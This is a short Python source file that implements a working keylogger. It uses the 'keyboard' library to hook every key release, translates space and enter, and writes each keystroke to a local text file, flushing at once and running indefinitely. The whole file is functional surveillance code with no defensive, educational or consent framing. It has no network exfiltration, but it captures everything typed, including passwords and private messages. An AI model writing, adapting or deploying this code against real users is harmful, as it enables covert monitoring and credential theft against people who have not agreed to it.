import keyboard

class KeyLogger():
    def __init__(self, filename):
        self.log_file = open(filename, "w")
    
    def ReadKey(self, key):
        print_key = key.name
        match print_key:
            case "space": print_key = " "
            case "enter": print_key = "\n"
            
        self.log_file.write(print_key)
        self.log_file.flush()

    def StartLog(self):
        keyboard.on_release(callback = self.ReadKey)
        keyboard.wait()

def main():
    key_log = KeyLogger("key_log_file.txt")
    while True:
        key_log.StartLog()


if __name__ == "__main__":
    main()